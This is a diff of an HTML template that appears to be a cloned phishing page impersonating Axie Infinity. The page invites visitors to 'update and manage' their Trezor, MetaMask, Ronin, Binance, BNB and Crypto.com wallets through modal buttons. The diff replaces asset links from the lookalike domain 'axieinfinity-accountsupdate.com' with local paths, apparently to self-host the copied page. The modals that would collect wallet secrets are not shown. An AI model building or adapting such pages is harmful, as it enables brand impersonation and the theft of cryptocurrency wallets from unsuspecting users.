@@ -16,7 +16,7 @@
         body {
             background-color: #101426;
         }
-        /*! CSS Used from: https://axieinfinity-accountsupdate.com/mini_lib/css/bootstrap.css */
+        /*! CSS Used from: /mini_lib/css/bootstrap.css */
         *,*::before,*::after{box-sizing:border-box;}
         h5{margin-top:0;margin-bottom:0.5rem;}
         p{margin-top:0;margin-bottom:1rem;}
@@ -85,7 +85,7 @@
         p{orphans:3;widows:3;}
         .container{min-width:992px!important;}
         }
-        /*! CSS Used from: https://axieinfinity-accountsupdate.com/css/style.css */
+        /*! CSS Used from: /css/style.css */
         *{margin:0;padding:0;-webkit-box-sizing:border-box;box-sizing:border-box;}
         .btn-icon{height:50px;width:50px;}
         .text-lightblue{color:#8F9BB3;}
@@ -112,7 +112,7 @@
         @endif
         <div class="container pb-5">
             <div class="row">
-                <div class="col-md-8 offset-md-2 text-center"><img src="https://axieinfinity-accountsupdate.com/img/axie_banner.png" alt="axie-infinity"
+                <div class="col-md-8 offset-md-2 text-center"><img src="/img/axie_banner.png" alt="axie-infinity"
                         class="mt-5 img-fluid">
                     <h5 class="text-white font-weight-bold mt-4 text-center">Axie Infinity</h5>
                     <p class="text-lightblue text-center mt-4">The best way to update and manage all your wallets from a
@@ -125,38 +125,38 @@
                     <div class="row mt-5">
                         <div class="col-md-6 px-2 mt-3">
                             <button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#trezorModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/trezorwallet.png" alt="Trezor wallet"
+                                <div class="form-inline"><img src="/img/trezorwallet.png" alt="Trezor wallet"
                                         class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">Trezor wallet</div>
                                 </div>
                             </button>
                         </div>
                         <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#metaModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/metamaskwallet.png" alt="Meta mask wallet"
+                                <div class="form-inline"><img src="/img/metamaskwallet.png" alt="Meta mask wallet"
                                         class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">Meta mask wallet</div>
                                 </div>
                             </button></div>
                         <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#roninModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/roninwallet.jpg" alt="Ronin wallet"
+                                <div class="form-inline"><img src="/img/roninwallet.png" alt="Ronin wallet"
                                         class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">Ronin wallet</div>
                                 </div>
                             </button></div>
                         <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#binanceModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/binancesmartchain.png"
+                                <div class="form-inline"><img src="/img/binancesmartchain.png"
                                         alt="Binance smart chain wallet" class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">Binance smart chain wallet</div>
                                 </div>
                             </button></div>
                         <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#bnbModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/bnbwallet.png" alt="BNB wallet"
+                                <div class="form-inline"><img src="/img/bnbwallet.png" alt="BNB wallet"
                                         class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">BNB wallet</div>
                                 </div>
                             </button></div>
                         <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#cryptoModal">
-                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/cryptowallet.png" alt="Crypto.com wallet"
+                                <div class="form-inline"><img src="/img/cryptowallet.png" alt="Crypto.com wallet"
                                         class="btn-icon img-fluid">
                                     <div class="text-dark font-weight-bold ml-2">Crypto.com wallet</div>
                                 </div>
